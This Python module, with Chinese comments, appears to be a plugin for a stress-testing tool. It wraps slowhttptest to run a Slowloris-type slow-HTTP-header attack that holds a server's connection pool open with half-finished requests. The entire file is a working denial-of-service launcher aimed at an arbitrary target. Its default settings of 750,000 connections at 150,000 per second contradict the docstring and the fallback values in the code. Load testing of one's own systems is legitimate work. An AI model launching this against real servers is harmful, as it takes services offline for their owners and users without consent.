"""
測項：慢速 HTTP Header 資源佔用（Slowloris 類型）
分類：HTTP/Web
底層工具：slowhttptest
對應原始命令：slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://<IP>/ -l 300
"""
from ..common import run_subprocess, clamp_duration

NAME = "慢速 HTTP Header 資源佔用"
CATEGORY = "HTTP/Web"
PROTOCOL = "HTTP"
DEFAULT_PORT = 80
TEST_TYPE = "resource"  # 連線型：Slowloris，大量保持半完成 header 的連線佔滿伺服器連線池


def get_param_schema() -> dict:
    return {
        "connections": {"type": "int", "default": 750000, "min": 1, "max": 750000, "desc": "-c 總連線數"},
        "connect_rate": {"type": "int", "default": 150000, "min": 1, "max": 150000, "desc": "-r 每秒建立連線數"},
        "interval_sec": {"type": "int", "default": 10, "min": 1, "max": 60, "desc": "-i 送出部分 header 間隔秒數"},
        "path": {"type": "string", "default": "/"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    conns = int(params.get("connections", 1500))
    rate = int(params.get("connect_rate", 300))
    interval = int(params.get("interval_sec", 10))
    path = params.get("path", "/")
    url = f"http://{target}:{port}{path}"

    cmd = [
        "slowhttptest", "-c", str(conns), "-H",
        "-i", str(interval), "-r", str(rate),
        "-t", "GET", "-u", url, "-l", str(duration),
    ]
    return run_subprocess(cmd, duration + 15, stop_event, log_fn)
